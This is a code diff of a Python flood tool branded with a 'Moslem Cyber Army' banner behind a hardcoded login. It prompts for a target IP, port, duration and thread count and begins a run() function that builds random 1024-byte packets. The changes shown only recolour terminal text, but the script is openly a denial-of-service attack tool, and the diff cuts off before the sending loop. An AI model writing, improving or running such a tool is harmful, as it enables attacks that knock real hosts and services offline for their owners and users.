@@ -36,7 +36,7 @@ while attemps < 100:
     password = input("\033[32mEnter your password: \033[0m")
 
     if username == 'kun' and password == 'fayakun':
-        print("\033[33m-------$ELAMAT DATANG DI ZONA MOSLEM CYBER ARMY------")
+        print("\033[32m-------$ELAMAT DATANG DI ZONA MOSLEM CYBER ARMY------")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -44,10 +44,10 @@ while attemps < 100:
         continue
 
 ip = str(input("\033[37m Target IP : \033[0m"))
-port = int(input("\033[36m Target Port : \033[0m"))
-choice = str(input("\033[36m (y/n) : \033[0m"))
-times = int(input("\033[36m Time : \033[0m"))
-threads = int(input("\033[36m Threads : \033[0m"))
+port = int(input("\033[37m Target Port : \033[0m"))
+choice = str(input("\033[37m (y/n) : \033[0m"))
+times = int(input("\033[37m Time : \033[0m"))
+threads = int(input("\033[37m Threads : \033[0m"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[+]","[*]","[!]"))
